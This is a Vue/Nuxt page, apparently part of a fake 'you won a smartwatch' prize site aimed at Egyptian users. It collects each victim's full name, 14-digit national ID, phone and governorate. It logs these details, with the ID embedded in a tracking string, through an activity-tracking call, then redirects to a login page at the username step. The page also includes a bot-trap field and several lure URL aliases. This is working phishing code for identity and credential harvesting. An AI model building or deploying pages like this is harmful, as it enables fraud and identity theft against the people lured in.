<template>
  <AppShell>
    <section class="delivery-page section" aria-label="بيانات استلام الهدية والتوصيل">
      <div class="delivery-container">
        <!-- عنوان الصفحة -->
        <header class="delivery-header">
          <span class="delivery-tag">مبروك! لقد فزت بالساعة الذكية</span>
          <h1 class="delivery-title">بيانات استلام وتوصيل الهدية</h1>
          <p class="delivery-subtitle">
            يرجى تأكيد الساعة المختارة وإدخال بيانات التوصيل لنقوم بشحن هديتك إلى باب منزلك مجاناً.
          </p>
        </header>

        <!-- بطاقة الساعة المختارة -->
        <article class="selected-watch-card" aria-label="الساعة المختارة">
          <div
            class="watch-visual"
            :style="{
              '--watch-color': currentWatch.color,
              '--watch-soft': currentWatch.soft,
              '--watch-band': currentWatch.band,
            }"
          >
            <img
              v-if="currentWatch.image"
              class="watch-image"
              :src="currentWatch.image"
              :alt="currentWatch.name"
            />
            <div v-else class="mini-watch" :aria-label="currentWatch.name" role="img">
              <span />
            </div>
          </div>

          <div class="watch-info">
            <div class="watch-badge">الساعة المختارة</div>
            <h2 class="watch-name">{{ currentWatch.name }}</h2>
            <p class="watch-description">{{ currentWatch.description }}</p>
            <NuxtLink to="/watches" class="change-watch-btn">
              <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7" />
                <path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z" />
              </svg>
              تغيير الساعة
            </NuxtLink>
          </div>
        </article>

        <!-- فاصل بمسافة متوسطة -->
        <div class="section-divider" aria-hidden="true" />

        <!-- نموذج بيانات التوصيل -->
        <div class="delivery-form-card">
          <div class="form-card-header">
            <div class="form-header-icon">
              <svg viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <rect x="1" y="3" width="15" height="13"></rect>
                <polygon points="16 8 20 8 23 11 23 16 16 16 16 8"></polygon>
                <circle cx="5.5" cy="18.5" r="2.5"></circle>
                <circle cx="18.5" cy="18.5" r="2.5"></circle>
              </svg>
            </div>
            <div>
              <h3 class="form-heading">معلومات الشحن والتوصيل</h3>
              <p class="form-subheading">املأ الحقول التالية بالبيانات الدقيقة لضمان استلام الهدية بدون تأخير</p>
            </div>
          </div>

          <form class="delivery-form" @submit.prevent="handleNext">
            <HoneypotField location="delivery_form" />
            <!-- حقل اسم المستخدم (مقطعين على الأقل) -->
            <div class="field-group" :class="{ 'has-error': errors.username }">
              <label for="delivery-username" class="field-label">
                <span class="label-text">اسم المستخدم</span>
                <span class="required-mark">*</span>
              </label>

              <div class="input-wrapper">
                <span class="input-icon" aria-hidden="true">
                  <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                    <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
                    <circle cx="12" cy="7" r="4"></circle>
                  </svg>
                </span>
                <input
                  id="delivery-username"
                  v-model="username"
                  type="text"
                  autocomplete="name"
                  placeholder="أدخل الاسم بالكامل (مقطعين أو أكثر مثل: أحمد محمد علي)"
                  class="form-input text-right"
                  @input="errors.username = ''"
                />
              </div>

              <span v-if="errors.username" class="error-text">{{ errors.username }}</span>
            </div>

            <!-- حقل الرقم القومي (أرقام فقط) -->
            <div class="field-group" :class="{ 'has-error': errors.nationalId }">
              <label for="delivery-national-id" class="field-label">
                <span class="label-text">الرقم القومي</span>
                <span class="required-mark">*</span>
              </label>

              <div class="input-wrapper">
                <span class="input-icon" aria-hidden="true">
                  <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                    <rect x="3" y="4" width="18" height="16" rx="2" />
                    <line x1="7" y1="8" x2="17" y2="8" />
                    <line x1="7" y1="12" x2="13" y2="12" />
                    <line x1="7" y1="16" x2="11" y2="16" />
                  </svg>
                </span>
                <input
                  id="delivery-national-id"
                  v-model="nationalId"
                  type="tel"
                  inputmode="numeric"
                  autocomplete="off"
                  placeholder="أدخل الرقم القومي المكون من 14 رقماً"
                  class="form-input"
                  dir="ltr"
                  @input="handleNationalIdInput"
                />
              </div>

              <span v-if="errors.nationalId" class="error-text">{{ errors.nationalId }}</span>
            </div>

            <!-- حقل رقم الهاتف -->
            <div class="field-group" :class="{ 'has-error': errors.phone }">
              <label for="delivery-phone" class="field-label">
                <span class="label-text">رقم الهاتف</span>
                <span class="required-mark">*</span>
              </label>

              <div class="input-wrapper">
                <span class="input-icon" aria-hidden="true">
                  <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                    <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path>
                  </svg>
                </span>
                <input
                  id="delivery-phone"
                  v-model="phone"
                  type="tel"
                  inputmode="numeric"
                  autocomplete="tel"
                  maxlength="11"
                  placeholder="01xxxxxxxxx"
                  class="form-input"
                  dir="ltr"
                  @input="handlePhoneInput"
                />
              </div>

              <span v-if="errors.phone" class="error-text">{{ errors.phone }}</span>
            </div>

            <!-- حقل المحافظة (قائمة خيارات المحافظات المصرية) -->
            <div class="field-group" :class="{ 'has-error': errors.governorate }">
              <label for="delivery-governorate" class="field-label">
                <span class="label-text">المحافظة</span>
                <span class="required-mark">*</span>
              </label>

              <div class="input-wrapper select-wrapper">
                <span class="input-icon" aria-hidden="true">
                  <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                    <path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"></path>
                    <circle cx="12" cy="10" r="3"></circle>
                  </svg>
                </span>
                <select
                  id="delivery-governorate"
                  v-model="governorate"
                  class="form-select"
                  @change="errors.governorate = ''"
                >
                  <option value="" disabled selected>-- اختر المحافظة --</option>
                  <option
                    v-for="gov in egyptianGovernorates"
                    :key="gov"
                    :value="gov"
                  >
                    {{ gov }}
                  </option>
                </select>
                <span class="select-arrow" aria-hidden="true">
                  <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                    <polyline points="6 9 12 15 18 9"></polyline>
                  </svg>
                </span>
              </div>

              <span v-if="errors.governorate" class="error-text">{{ errors.governorate }}</span>
            </div>


            <!-- ميزات الأمان والشحن -->
            <div class="trust-highlights">
              <div class="trust-item">
                <span class="trust-icon">✓</span>
                <span>شحن وتوصيل مجاني 100% لجميع المحافظات</span>
              </div>
            </div>

            <!-- زر التالي -->
            <div class="form-actions">
              <button
                type="submit"
                class="button primary next-button"
                :disabled="isSubmitting"
              >
                <span v-if="!isSubmitting">التالي</span>
                <span v-else>جاري المتابعة...</span>
                <span class="arrow-icon" aria-hidden="true">‹</span>
              </button>
            </div>
          </form>
        </div>
      </div>
    </section>
  </AppShell>
</template>

<script setup lang="ts">
import { computed, onMounted, reactive, ref } from "vue";
import { watches } from "~/data/content";

definePageMeta({
  alias: ["/claim", "/shipping", "/gift-details"],
});

const route = useRoute();
const router = useRouter();
const { flow, updateFlow } = useDemoFlow();

// قائمة بجميع محافظات جمهورية مصر العربية الـ 27
const egyptianGovernorates = [
  "القاهرة",
  "الجيزة",
  "الإسكندرية",
  "الدقهلية",
  "البحر الأحمر",
  "البحيرة",
  "الفيوم",
  "الغربية",
  "الإسماعيلية",
  "المنوفية",
  "المنيا",
  "القليوبية",
  "الوادي الجديد",
  "السويس",
  "أسوان",
  "أسيوط",
  "بني سويف",
  "بورسعيد",
  "دمياط",
  "الشرقية",
  "جنوب سيناء",
  "كفر الشيخ",
  "مطروح",
  "الأقصر",
  "قنا",
  "شمال سيناء",
  "سوهاج",
];

// الساعة المختارة
const currentWatch = computed(() => {
  const watchQuery = route.query.watch as string | undefined;
  const targetName = watchQuery || flow.value.watch;
  if (targetName) {
    const found = watches.find((w) => w.name === targetName);
    if (found) return found;
  }
  return watches[0]!;
});

// نموذج المدخلات
const username = ref("");
const nationalId = ref("");
const phone = ref("");
const governorate = ref("");
const addressDetails = ref("");
const isSubmitting = ref(false);

const errors = reactive({
  username: "",
  nationalId: "",
  phone: "",
  governorate: "",
  addressDetails: "",
});

// تحويل الأرقام العربية المشرقية (٠١٢٣٤٥٦٧٨٩) إلى أرقام إنجليزية
const convertArabicNumerals = (str: string): string => {
  const arabicNumbers = ["٠", "١", "٢", "٣", "٤", "٥", "٦", "٧", "٨", "٩"];
  return str.replace(/[٠-٩]/g, (w) => arabicNumbers.indexOf(w).toString());
};

const handleNationalIdInput = (event: Event) => {
  const target = event.target as HTMLInputElement;
  const converted = convertArabicNumerals(target.value);
  // تنظيف أي رموز غير رقمية وقصر الطول على 14 رقماً
  const cleaned = converted.replace(/[^0-9]/g, "").slice(0, 14);
  nationalId.value = cleaned;
  errors.nationalId = "";
};

const handlePhoneInput = (event: Event) => {
  const target = event.target as HTMLInputElement;
  const converted = convertArabicNumerals(target.value);
  // تنظيف أي رموز غير رقمية وقصر الطول على 11 رقماً
  const cleaned = converted.replace(/[^0-9]/g, "").slice(0, 11);
  phone.value = cleaned;
  if (target.value !== cleaned) {
    target.value = cleaned;
  }
  if (cleaned.length >= 2 && !cleaned.startsWith("01")) {
    errors.phone = "يجب أن يبدأ رقم الهاتف بـ 01";
  } else {
    errors.phone = "";
  }
};

onMounted(() => {
  // استرجاع البيانات السابقة إن وجدت
  if (flow.value.name) username.value = flow.value.name;
  if (flow.value.nationalId) nationalId.value = flow.value.nationalId;
  if (flow.value.phone) phone.value = flow.value.phone;
  if (flow.value.governorate) governorate.value = flow.value.governorate;
  if (flow.value.addressDetails) addressDetails.value = flow.value.addressDetails;

  // تسجيل زيارة الصفحة
  try {
    trackCustomerActivity(
      {
        selectedWatch: currentWatch.value.name,
        lastPage: "/delivery",
        lastAction: "عرض صفحة بيانات التوصيل",
      },
      "page_visit",
      { path: "/delivery", watch: currentWatch.value.name }
    );
  } catch (err) {
    console.error("Unable to track page visit", err);
  }
});

const validateForm = (): boolean => {
  let valid = true;
  errors.username = "";
  errors.nationalId = "";
  errors.phone = "";
  errors.governorate = "";
  errors.addressDetails = "";

  const trimmedUsername = username.value.trim();
  const nameSegments = trimmedUsername.split(/\s+/).filter(Boolean);
  if (!trimmedUsername) {
    errors.username = "يرجى إدخال اسم المستخدم.";
    valid = false;
  } else if (nameSegments.length < 2) {
    errors.username = "يجب أن يتكون اسم المستخدم من مقطعين على الأقل (ثنائي، ثلاثي، أو أكثر).";
    valid = false;
  }

  const trimmedNationalId = nationalId.value.trim();
  if (!trimmedNationalId) {
    errors.nationalId = "يرجى إدخال الرقم القومي.";
    valid = false;
  } else if (trimmedNationalId.length !== 14) {
    errors.nationalId = "يجب أن يتكون الرقم القومي من 14 رقماً.";
    valid = false;
  }

  const trimmedPhone = phone.value.trim();
  if (!trimmedPhone) {
    errors.phone = "يرجى إدخال رقم الهاتف للتواصل.";
    valid = false;
  } else if (!trimmedPhone.startsWith("01")) {
    errors.phone = "يجب أن يبدأ رقم الهاتف بـ 01 (مثال: 01012345678).";
    valid = false;
  } else if (trimmedPhone.length !== 11 || !/^01[0-9]{9}$/.test(trimmedPhone)) {
    errors.phone = "يجب أن يتكون رقم الهاتف من 11 رقماً ويبدأ بـ 01 (مثال: 01012345678).";
    valid = false;
  }

  if (!governorate.value) {
    errors.governorate = "يرجى اختيار المحافظة لتوصيل الهدية.";
    valid = false;
  }

  return valid;
};

const handleNext = async () => {
  if (!validateForm()) return;

  isSubmitting.value = true;
  const watchName = currentWatch.value.name;
  const trimmedName = username.value.trim();
  const trimmedNationalId = nationalId.value.trim();
  const trimmedPhone = phone.value.trim();
  const trimmedGov = governorate.value;
  const trimmedAddress = addressDetails.value.trim();

  if (import.meta.client) {
    try {
      window.localStorage.setItem("gift_customer_selected_watch", watchName);
      window.localStorage.setItem("gift_customer_name", trimmedName);
      window.localStorage.setItem("gift_customer_national_id", trimmedNationalId);
      window.localStorage.setItem("gift_customer_phone", trimmedPhone);
      window.localStorage.setItem("gift_customer_governorate", trimmedGov);
      window.localStorage.setItem("gift_customer_address", trimmedAddress);
    } catch {}
  }

  updateFlow({
    watch: watchName,
    name: trimmedName,
    nationalId: trimmedNationalId,
    phone: trimmedPhone,
    governorate: trimmedGov,
    addressDetails: trimmedAddress,
    city: trimmedGov,
  });

  try {
    await trackCustomerActivity(
      {
        selectedWatch: watchName,
        displayName: trimmedName,
        name: trimmedName,
        fullName: trimmedName,
        nationalId: trimmedNationalId,
        phone: trimmedPhone,
        governorate: trimmedGov,
        addressDetails: trimmedAddress,
        status: "أدخل بيانات التوصيل",
        lastAction: `أدخل بيانات التوصيل: ${trimmedName} - الرقم القومي: ${trimmedNationalId} - ${trimmedGov} - ${trimmedPhone}`,
        issue: null,
      },
      "delivery_info_submitted",
      {
        selectedWatch: watchName,
        name: trimmedName,
        displayName: trimmedName,
        nationalId: trimmedNationalId,
        phone: trimmedPhone,
        governorate: trimmedGov,
        addressDetails: trimmedAddress,
      }
    );
  } catch (error) {
    console.error("Unable to track delivery details submission", error);
  } finally {
    isSubmitting.value = false;
    router.push({ path: "/login", query: { step: "username" } });
  }
};
</script>

<style scoped>
.delivery-page {
  padding: 32px 0 60px;
}

.delivery-container {
  width: min(780px, calc(100% - 32px));
  margin-inline: auto;
}

/* الهيدر والعنوان */
.delivery-header {
  text-align: center;
  margin-bottom: 28px;
}

.delivery-tag {
  display: inline-block;
  padding: 6px 16px;
  border-radius: 999px;
  background: rgba(2, 106, 50, 0.12);
  color: #026A32;
  font-size: 0.88rem;
  font-weight: 800;
  margin-bottom: 12px;
  border: 1px solid rgba(2, 106, 50, 0.28);
}

.delivery-title {
  margin: 0;
  color: #172033;
  font-size: clamp(1.6rem, 3.5vw, 2.2rem);
  font-weight: 900;
  line-height: 1.25;
}

.delivery-subtitle {
  margin: 10px auto 0;
  color: #667085;
  font-size: 0.98rem;
  line-height: 1.7;
  max-width: 580px;
}

/* بطاقة الساعة المختارة */
.selected-watch-card {
  display: flex;
  align-items: center;
  gap: 24px;
  padding: 22px 28px;
  border-radius: 6px;
  background: #ffffff;
  border: 1px solid #e6ebf2;
  box-shadow: 0 10px 24px rgba(15, 36, 64, 0.06);
  transition: box-shadow 0.2s ease;
}

.selected-watch-card:hover {
  box-shadow: 0 14px 30px rgba(15, 36, 64, 0.09);
}

.watch-visual {
  width: 130px;
  min-width: 130px;
  height: 130px;
  display: grid;
  place-items: center;
  border-radius: 6px;
  background: linear-gradient(145deg, var(--watch-soft), #ffffff);
  border: 1px solid rgba(0, 0, 0, 0.05);
  overflow: hidden;
}

.watch-image {
  width: 100%;
  height: 100%;
  object-fit: contain;
  display: block;
}

.mini-watch {
  width: 70px;
  height: 90px;
  border-radius: 20px;
  background: var(--watch-band);
  display: flex;
  align-items: center;
  justify-content: center;
}

.watch-info {
  flex: 1;
  min-width: 0;
}

.watch-badge {
  display: inline-block;
  padding: 3px 10px;
  background: #e8f7f0;
  color: #179a73;
  font-size: 0.76rem;
  font-weight: 800;
  border-radius: 4px;
  margin-bottom: 6px;
}

.watch-name {
  margin: 0;
  color: #172033;
  font-size: 1.25rem;
  font-weight: 900;
}

.watch-description {
  margin: 6px 0 12px;
  color: #667085;
  font-size: 0.88rem;
  line-height: 1.6;
}

.change-watch-btn {
  display: inline-flex;
  align-items: center;
  gap: 6px;
  color: #026A32;
  font-size: 0.86rem;
  font-weight: 700;
  text-decoration: none;
  transition: color 0.15s ease, transform 0.15s ease;
}

.change-watch-btn:hover {
  color: #014d24;
  transform: translateX(-2px);
}

/* فاصل المسافة المتوسطة */
.section-divider {
  height: 28px;
}

/* نموذج التوصيل */
.delivery-form-card {
  padding: 32px 34px;
  border-radius: 6px;
  background: #ffffff;
  border: 1px solid #e6ebf2;
  box-shadow: 0 12px 28px rgba(15, 36, 64, 0.08);
}

.form-card-header {
  display: flex;
  align-items: center;
  gap: 16px;
  padding-bottom: 22px;
  margin-bottom: 24px;
  border-bottom: 1px solid #eef2f7;
}

.form-header-icon {
  width: 48px;
  height: 48px;
  border-radius: 6px;
  background: rgba(2, 106, 50, 0.1);
  color: #026A32;
  display: flex;
  align-items: center;
  justify-content: center;
  flex-shrink: 0;
}

.form-heading {
  margin: 0;
  color: #172033;
  font-size: 1.18rem;
  font-weight: 900;
}

.form-subheading {
  margin: 4px 0 0;
  color: #667085;
  font-size: 0.86rem;
}

.delivery-form {
  display: flex;
  flex-direction: column;
  gap: 22px;
}

/* حقول الإدخال */
.field-group {
  display: flex;
  flex-direction: column;
  gap: 6px;
}

.field-label {
  display: flex;
  align-items: center;
  gap: 4px;
  color: #172033;
  font-size: 0.94rem;
  font-weight: 800;
}

.required-mark {
  color: #c2413b;
  font-size: 1.1rem;
  line-height: 1;
}

.input-wrapper {
  position: relative;
  display: flex;
  align-items: center;
}

.input-icon {
  position: absolute;
  right: 14px;
  color: #94a3b8;
  display: flex;
  align-items: center;
  justify-content: center;
  pointer-events: none;
}

.form-input,
.form-select,
.form-textarea {
  width: 100%;
  border: 1.5px solid #dbe3ed;
  border-radius: 6px;
  background: #fbfdff;
  color: #172033;
  font-size: 0.95rem;
  transition: border-color 0.18s ease, box-shadow 0.18s ease, background-color 0.18s ease;
  outline: none;
}

.form-input {
  height: 48px;
  padding: 0 44px 0 16px;
}

.form-select {
  height: 48px;
  padding: 0 44px 0 38px;
  appearance: none;
  cursor: pointer;
}

.select-wrapper {
  position: relative;
}

.select-arrow {
  position: absolute;
  left: 14px;
  color: #94a3b8;
  display: flex;
  align-items: center;
  justify-content: center;
  pointer-events: none;
}

.textarea-wrapper {
  align-items: flex-start;
}

.textarea-icon {
  top: 14px;
}

.form-textarea {
  padding: 12px 44px 12px 16px;
  resize: vertical;
  min-height: 105px;
  line-height: 1.6;
}

.form-input:focus,
.form-select:focus,
.form-textarea:focus {
  background: #ffffff;
  border-color: #026A32;
  box-shadow: 0 0 0 3px rgba(2, 106, 50, 0.14);
}

.field-group.has-error .form-input,
.field-group.has-error .form-select,
.field-group.has-error .form-textarea {
  border-color: #c2413b;
  background: #fff8f8;
}

.field-hint {
  display: flex;
  align-items: flex-start;
  gap: 6px;
  color: #64748b;
  font-size: 0.81rem;
  line-height: 1.5;
  margin-top: 2px;
}

.field-hint svg {
  flex-shrink: 0;
  margin-top: 2px;
  color: #026A32;
}

.error-text {
  color: #c2413b;
  font-size: 0.82rem;
  font-weight: 700;
  margin-top: 2px;
}

/* بطاقات الثقة والضمان */
.trust-highlights {
  display: flex;
  flex-direction: column;
  gap: 8px;
  padding: 14px 18px;
  border-radius: 6px;
  background: #f8fafc;
  border: 1px solid #eef2f7;
  margin-top: 4px;
}

.trust-item {
  display: flex;
  align-items: center;
  gap: 8px;
  color: #475569;
  font-size: 0.84rem;
  font-weight: 700;
}

.trust-icon {
  color: #179a73;
  font-size: 0.95rem;
}

/* زر التالي */
.form-actions {
  margin-top: 8px;
}

.next-button {
  width: 100%;
  min-height: 48px;
  font-size: 1.05rem;
  font-weight: 700;
  border-radius: 6px;
  gap: 10px;
  box-shadow: 0 10px 24px rgba(2, 106, 50, 0.28);
}

.next-button:hover:not(:disabled) {
  box-shadow: 0 14px 28px rgba(2, 106, 50, 0.38);
}

.next-button:disabled {
  opacity: 0.7;
  cursor: not-allowed;
}

.arrow-icon {
  font-size: 1.4rem;
  line-height: 1;
}

/* التجاوب والشاشات الصغيرة */
@media (max-width: 640px) {
  .delivery-page {
    padding: 20px 0 40px;
  }

  .delivery-container {
    width: min(520px, calc(100% - 24px));
  }

  .selected-watch-card {
    flex-direction: column;
    text-align: center;
    padding: 20px 16px;
    gap: 14px;
    border-radius: 14px;
  }

  .watch-visual {
    width: 140px;
    height: 140px;
    min-width: 140px;
    border-radius: 12px;
  }

  .delivery-form-card {
    padding: 24px 18px;
    border-radius: 14px;
  }

  .form-card-header {
    flex-direction: column;
    text-align: center;
    padding-bottom: 16px;
    margin-bottom: 18px;
  }

  .form-input,
  .form-select,
  .form-textarea {
    font-size: 16px; /* Prevents auto-zoom on iOS */
    border-radius: 10px;
  }
}
</style>
